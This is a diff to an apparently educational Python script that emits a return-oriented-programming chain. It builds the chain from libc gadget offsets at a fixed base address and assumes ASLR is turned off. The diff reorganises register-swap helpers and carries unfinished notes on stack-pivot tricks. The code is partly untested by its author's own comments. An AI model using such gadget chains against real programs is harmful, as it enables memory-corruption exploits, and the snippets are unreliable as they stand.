@@ -6,10 +6,33 @@ class ROP:
     #TODO: set /proc/sys/kernel/randomize_va_space to 0
     # head starts in ecx, move to edx
     #******FIX*******
+
+    def xchg_w_eax(self, reg):
+        if (reg == "ebp"):
+            sys.stdout.buffer.write((0x0002d455 + 0xb7dec000).to_bytes(4, byteorder='little'))
+        if (reg == "ebx"):
+            sys.stdout.buffer.write((0x000f99df + 0xb7dec000).to_bytes(4, byteorder='little'))
+        if (reg == "ecx"):
+            #TRASHES ECX: xchg eax, ecx ; and al, 0x5b ; ret
+            sys.stdout.buffer.write((0x0002664e + 0xb7dec000).to_bytes(4, byteorder='little'))
+        if (reg == "edi"):
+            sys.stdout.buffer.write((0x00020a3d + 0xb7dec000).to_bytes(4, byteorder='little'))
+        if (reg == "edx"):
+            sys.stdout.buffer.write((0x00041702 + 0xb7dec000).to_bytes(4, byteorder='little'))
+        if (reg == "esi"):
+            sys.stdout.buffer.write((0x0001b286 + 0xb7dec000).to_bytes(4, byteorder='little'))
+        if (reg == "esp"):
+            sys.stdout.buffer.write((0x0001b269 + 0xb7dec000).to_bytes(4, byteorder='little'))
+
+    def swp_regs(self, reg1, reg2):
+        self.xchg_w_eax(reg1)
+        self.xchg_w_eax(reg2)
+        self.xchg_w_eax(reg1)
+
     def initialize_head_state(self):
         # initialize head
-        sys.stdout.buffer.write((0x0002effc + 0xb7dec000).to_bytes(4, byteorder='little')) # pop edx
-        sys.stdout.buffer.write((0x0008ae23 + 0xb7dec000).to_bytes(4, byteorder='little')) # push ecx -> NEED TO FIX THIS
+        self.swp_regs("edx", "ecx")
+        
     
     def write_head(self, num):
         # head is edx, eax is the value, moving eax into edx
@@ -33,7 +56,7 @@ class ROP:
     def move_head_right(self):
         #NOTE: ADDED NOPS TO BALANCE W/ MOVE_HEAD_LEFT - think this works?
         sys.stdout.buffer.write((0x0002d654 + 0xb7dec000).to_bytes(4, byteorder='little')) # : inc edx ; ret
-        sys.stdout.buffer.write((0x0001a8bf + 0xb7dec000).to_bytes(4, byteorder='little')) #nop ; ret
+        sys.stdout.buffer.write((0x0001a8bf + 0xb7dec000).to_bytes(4, byteorder='little')) # nops with rets
         sys.stdout.buffer.write((0x0001a8bf + 0xb7dec000).to_bytes(4, byteorder='little'))
         sys.stdout.buffer.write((0x0001a8bf + 0xb7dec000).to_bytes(4, byteorder='little'))
         sys.stdout.buffer.write((0x0001a8bf + 0xb7dec000).to_bytes(4, byteorder='little'))
@@ -51,6 +74,10 @@ class ROP:
             sys.stdout.buffer.write((0x000651a6 + 0xb7dec000).to_bytes(4, byteorder='little'))
         if(reg == "esp"):
             sys.stdout.buffer.write((0x00020668 + 0xb7dec000).to_bytes(4, byteorder='little'))
+        if(reg == "ecx"): # NOTE: will trash ebx
+            self.xchg_w_eax("ebx")
+            sys.stdout.buffer.write((0x000d3f2b + 0xb7dec000).to_bytes(4, byteorder='little'))  # 0x000d3f2b : inc ecx ; add al, 0x89 ; ret
+            self.xchg_w_eax("ebx")
 
     def decrement_reg(self, reg):
         if(reg == "eax"):
@@ -73,28 +100,6 @@ class ROP:
     def eax_plus_ecx(self):
         # EAX = EAX + ECX
         sys.stdout.buffer.write((0x00098a40 + 0xb7dec000).to_bytes(4, byteorder='little'))   
-
-    def xchg_w_eax(self, reg):
-        if (reg == "ebp"):
-            sys.stdout.buffer.write((0x0002d455 + 0xb7dec000).to_bytes(4, byteorder='little'))
-        if (reg == "ebx"):
-            sys.stdout.buffer.write((0x000f99df + 0xb7dec000).to_bytes(4, byteorder='little'))
-        if (reg == "ecx"):
-            #TRASHES ECX: xchg eax, ecx ; and al, 0x5b ; ret
-            sys.stdout.buffer.write((0x0002664e + 0xb7dec000).to_bytes(4, byteorder='little'))
-        if (reg == "edi"):
-            sys.stdout.buffer.write((0x00020a3d + 0xb7dec000).to_bytes(4, byteorder='little'))
-        if (reg == "edx"):
-            sys.stdout.buffer.write((0x00041702 + 0xb7dec000).to_bytes(4, byteorder='little'))
-        if (reg == "esi"):
-            sys.stdout.buffer.write((0x0001b286 + 0xb7dec000).to_bytes(4, byteorder='little'))
-        if (reg == "esp"):
-            sys.stdout.buffer.write((0x0001b269 + 0xb7dec000).to_bytes(4, byteorder='little'))
-
-    def swp_regs(self, reg1, reg2):
-        self.xchg_w_eax(reg1)
-        self.xchg_w_eax(reg2)
-        self.xchg_w_eax(reg1)
 
     def zero_out_reg(self, reg):
         if(reg == "eax"):
@@ -201,18 +206,32 @@ class ROP:
         #TODO: PUT ESP_DELTA INTO EDX
         # esp_delta = 74 -> change this
         self.pop_register("edx")
-        sys.stdout.buffer.write((0x4a).to_bytes(4, byteorder='little'))
+        sys.stdout.buffer.write((74).to_bytes(4, byteorder='little'))
         # and eax, esp_delta
         self.and_eax_register("edx") # and eax, edx (esp_delta)
 
         #increment counter before jump
-        self.increment_reg("ecx")
 
+        self.increment_reg("ecx")
         # eax has esp_delta, need to add esp, eax
         # TODO: can't use xchg with this and can't use push...FIX!! 
         # 0x0007672a : mov dword ptr [edx], eax ; ret // 8902c3
-        # put write mem address into edx?
-        #add esp, 0x7c; ret
+        # put right mem address into edx?
+            # SPECIFIC ESP DELTA ADD
+            # 0x00064ef8 : add esp, 0x7c ; ret // 83c47cc3
+            # sys.stdout.buffer.write((0x0001a8bf + 0xb7dec000).to_bytes(4, byteorder='little')) # noop
+            # sys.stdout.buffer.write((0x0001a8bf + 0xb7dec000).to_bytes(4, byteorder='little')) # noop
+            # sys.stdout.buffer.write((0x00064ef8 + 0xb7dec000).to_bytes(4, byteorder='little')) # add esp, 0x7c ; ret
+        # keep count in a variable of number of instructions
+        # each instruction is 4 bytes? CHECK THIS
+        # use some kind of register to store esp delta
+        # move register (with esp delta) to the address in memory
+        # swap eax with edx
+        # eax = base address + offset (378h + count), at this address we will store esp delta 
+        # 0x000f4834 : mov dword ptr [eax], edx ; ret // 8910c3
+        # 0x00098ffc : add dword ptr [eax], esp ; ret // 0120c3
+        # pop esp
+
         self.push_register("esp")
         self.pop_register("edx")
         self.add_eax_to_edx()
